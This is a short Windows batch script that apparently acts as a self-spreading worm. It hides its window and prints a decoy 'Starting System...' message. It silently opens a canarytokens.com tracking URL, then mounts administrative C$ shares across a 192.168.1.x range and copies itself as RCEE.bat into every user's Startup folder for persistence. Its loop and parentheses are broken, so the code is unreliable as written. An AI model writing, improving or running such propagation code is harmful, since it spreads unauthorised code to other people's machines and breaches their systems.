@echo off
mode con: cols=20 lines=1
cd %systemroot%
echo Starting System... 
start /b http://canarytokens.com/tags/stuff/feedback/khy8l2wpsde59nucdfbbqlsa0/post.jsp

SET i=0

net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy shell:startup\RCEE.bat "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RCEE.bat" else (exit)
:: mountvol Z: /d)
if %i% == 256 (exit) else (set /a i=i+1)


timeout /t 0.80 /nobreak > nul
exit
